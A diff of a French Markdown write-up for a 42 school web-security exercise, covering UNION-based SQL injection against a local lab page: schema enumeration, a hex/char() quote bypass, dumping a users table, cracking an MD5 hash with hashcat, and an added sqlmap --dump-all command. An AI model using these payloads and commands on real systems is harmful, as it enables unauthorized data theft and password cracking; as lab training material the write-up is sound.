@@ -23,32 +23,32 @@ renvoie rien -> a surement throw une erreur dans le back -> il n'y a pas de troi
 
 maintenant on sait donc que toutes nos prochainse requettes doivent renvoyer 2 colonnes sinon elle ne pouront pas fonctionner
 
-## check infos sur la db (eg. version, ...)
+## check infos de la db (eg. version, ...)
 ```sql
 1 UNION SELECT version(), user()
 ```
-renvoie la premiere image grace a '1' -> puis execute l'instruction suivante 'UNION' etant un && en gros -> return borntosec@localhost pour user() et 5.5.64-MariaDB-1ubuntu0.14.04.1 pour version()
+renvoie la premiere image grace a '1' -> puis execute l'instruction suivante 'UNION' etant comme un `&&` en bash -> return borntosec@localhost pour user() et 5.5.64-MariaDB-1ubuntu0.14.04.1 pour version()
 
 ## check tous les nom de toutes les db
 ```sql
 1 UNION SELECT schema_name, 1 FROM information_schema.schemata
 ```
-renvoie les nom de toutes les db du back comme ca on sait quoi cibler mtn -> Member_Sql_Injection PAR EXEMPLE
+renvoie les nom de toutes les db du back, maintenant on sait quoi cibler -> Member_Sql_Injection PAR EXEMPLE
 
 ## lister toutes les tables de la db qui nous interesse
 ```sql
 1 UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema='Member_Sql_Injection'
 ```
-ca ca renvoie que dal, pourquoi ?? par ce que les quotes sont surement transformees en '\ dans le back. on bypass ca soit en hexa soit avec char().
+ca, ca renvoi rien, pourquoi ?? par ce que les quotes sont surement transformees en '\ dans le back. on bypass ca en convertissant `users` en hexa ou en char(x, x, ...)
 
-en haxa, 'Member_Sql_Injection' = 0x4d656d6265725f53716c5f496e6a656374696f6e
+en hexa, 'Member_Sql_Injection' = 0x4d656d6265725f53716c5f496e6a656374696f6e
 
 en char(), 'Member_Sql_Injection' = char(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)
 
 ```sql
 1 UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema=0x4d656d6265725f53716c5f496e6a656374696f6e
 ```
-ca renvoie donc toutes les tables qui sont : users c'est tout...
+ca renvoie donc toutes les tables qui sont : `users` c'est tout...
 
 ## lister tous les champs de la table users
 ```sql
@@ -60,7 +60,7 @@ meme chose que au dessus mais cette fois avec la table `users (0x7573657273)` et
 | :-----: | :---: | :---: | :-----: | :-------: | :--------: | :--------: | :---------: |
 | ...     | ...   | ...   | ...     | ...       | ...        | ...        | ...         |
 
-## lister toutes les valeurs de toutes les colonnes
+## lister toutes les valeures de toutes les colonnes
 ```sql
 1 UNION SELECT user_id, town FROM Member_Sql_Injection.users
 ```
@@ -74,12 +74,12 @@ on sait qu'on a que 2 colonnes affichables, on peut donc récupérer les colonne
 | 5 | 42 | 42 | 42 | GetThe | Flag | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |
 
 ## crack le mot de passe
-d'abord on telecharge et compile hashcat
+d'abord on clone et compile hashcat
 ```bash
-./install_hashcat.sh
+git clone https://github.com/hashcat/hashcat.git hashcat && cd hashcat && make
 ```
 apres on decrypt le mot de passe par brute force avec les indices qu'on a, on sait que y'a des majuscules, surement des minuscules et pas de chiffres, c'est une supposition grace au commentaire dans la db.
-surement pas plus de 8 caracteres aussi, ca reste un exo de 42, ils veulent pas qu'on passe 6 ans a crack un mot de passe
+surement pas plus de 8 caracteres aussi, ca reste un exo de 42, ils veulent pas qu'on passe 6 ans a crack un mot de passe.
 surement pas de signes speciaux pour la meme raison.
 ```bash
 ./hashcat -m 0 -a 3 ../hash.txt -1 '?l?u' '?1?1?1?1?1?1?1?1' --increment -O
@@ -97,6 +97,16 @@ surement pas de signes speciaux pour la meme raison.
 `--increment` on a cree un mask de 8 caractere mais on ne sait pas quelle taille fait le mot de passe, donc utilise cet argument pour tester toutes les tailles de mot de passe entre 1 et la taille du mask
 
 `-O` optimized kernels -> ca va vite
+
+## dump
+avec tout ca on peut facilement extraire toutes les valeures de toutes les colonnes de toutes les tables facilement. pour economiser du temps j'ai dump tout ca avec sqlmap. le sujet dit "You cannot use scripts such as sqlmap to make exploitation look trivial". etant donne que j'ai explique comment faire sans et que c'est uniquement pour eviter de faire 300 requettes a la main. voila voila
+```bash
+gcl https://github.com/sqlmapproject/sqlmap.git sqlmap
+```
+```bash
+python3 sqlmap/sqlmap.py -u "http://localhost:8080/index.php?page=searchimg&id=1&Submit=Submit" -p id --dbms=MySQL --technique=U --dump-all
+```
+on obtient donc le fichier `log.txt` qui contient toutes les tables bien presentees.
 
 # annexe
 ### ORDER BY
